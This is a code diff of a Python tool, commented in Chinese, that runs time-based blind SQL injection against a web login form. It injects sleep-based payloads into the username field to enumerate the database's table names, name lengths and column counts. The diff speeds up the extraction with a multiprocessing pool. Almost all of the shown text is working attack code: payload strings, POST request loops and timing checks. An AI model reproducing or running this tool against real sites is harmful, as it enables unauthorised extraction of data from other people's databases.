@@ -6,7 +6,7 @@ import collections
 import tqdm  # 进度条库
 import multiprocessing as mp
 
-core_num=8
+core_num=14
 value = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ%&^@_.-!{}"
 '''
 haveget:
@@ -97,7 +97,7 @@ def get_database(url):
         if res[i]: ans[arg1[i][0]] = arg1[i][1]
     haveget['database'] = {'curr': ''.join(ans)}
 
-# 获取数表数量
+# 获取表数量
 def get_table_num():
     '''
     获取数据库表单数
@@ -126,20 +126,26 @@ def get_table_num():
             break
 
 # 获取表长度
+def check_length_table(parameter):
+    i,url=parameter
+    for n in range(1, 100):
+        payload = "test' and if((select length(table_name) from information_schema.tables where table_schema=database() limit {0},1)={1},sleep(2),1) #".format(i, n)
+        data = {"username": payload, "password": '123'}
+        start_time = time.time()
+        requests.post(url, data=data)
+        end_time = time.time()
+        use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
+        if use_time > 1.8:
+            return n
+# 获取表长度主函数
 def get_length_table():
     global haveget
-    for i in range(haveget['length']['t0']):
-        for n in range(1, 100):
-            payload = "test' and if((select length(table_name) from information_schema.tables where table_schema=database() limit {0},1)={1},sleep(2),1) #".format(i,n)
-            data = {"username": payload, "password": '123'}
-            start_time = time.time()
-            requests.post(url, data=data)
-            end_time = time.time()
-            use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
-            if use_time > 1.8:
-                print("...... table {0} length is:".format(i+1) + str(n))
-                haveget['length']['t{}'.format(i+1)] = n
-                break
+    arg1=[(i,url)for i in range(haveget['length']['t0'])]
+    with mp.Pool(core_num) as p:
+        res = list(tqdm.tqdm(p.imap(check_length_table, arg1), total=len(arg1)))
+    for i in range(len(res)):
+        haveget['length']['t{}'.format(i + 1)] = res[i]
+        print("...... table {0} length is:".format(i + 1) + str(res[i]))
 
 # 判断表字符
 def check_table(parameter):
@@ -168,25 +174,32 @@ def get_table(url):
         if res[i]:
             ans[arg1[i][0]][arg1[i][1]] = arg1[i][2]
     for i in range(haveget['length']['t0']):
-        haveget['table']['curr'][i+1] = ''.join(ans[i])
+        tmp=''.join(ans[i])
+        haveget['table']['curr'][i+1] = tmp
+        print('......table {0} is:'.format(i+1)+tmp)
     haveget['table']['curr'][0] = haveget['length']['t0']
 
 # 获取表的列数
-def get_column_num():
+def check_num_column(parameter):
+    table, url = parameter
+    for n in range(1, 100):
+        payload = "test' and if((select count(*) from information_schema.columns where table_name='{0}')={1},sleep(2),1) #".format(table, n)
+        data = {"username": payload, "password": '123'}
+        start_time = time.time()
+        requests.post(url, data=data)
+        end_time = time.time()
+        use_time = end_time - start_time
+        if use_time > 1.8:return n
+
+# 获取表的列数主函数
+def get_column_num(url):
     global haveget
-    for i in range(haveget['table']['curr'][0]):
-        table=haveget['table']['curr'][i+1]
-        for n in range(1, 100):
-            payload = "test' and if((select count(*) from information_schema.columns where table_name='{0}')={1},sleep(2),1) #".format(table,n)
-            data = {"username": payload, "password": '123'}
-            start_time = time.time()
-            requests.post(url, data=data)
-            end_time = time.time()
-            use_time = end_time - start_time
-            if use_time > 1.8:
-                print("......the column num of {0} table is:".format(i+1) + str(n))
-                haveget['length'][table] = {'c0': n}
-                break
+    arg1=[(haveget['table']['curr'][i+1],url) for i in range(haveget['table']['curr'][0])]
+    with mp.Pool(core_num) as p:
+        res = list(tqdm.tqdm(p.imap(check_num_column, arg1), total=len(arg1)))
+    for i in range(len(res)):
+        haveget['length'][haveget['table']['curr'][i+1]] = {'c0': res[i]}
+        print("......the column num of {0} table is:".format(i + 1) + str(res[i]))
 
 # 获取列名长度
 def get_length_column():
@@ -341,7 +354,7 @@ if __name__ == "__main__":
         logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_table(url)
         logger.info('{0}  正在获取当前各表列数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_column_num()
+        get_column_num(url)
         logger.info('{0}  正在获取各列名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
         get_length_column()
         logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
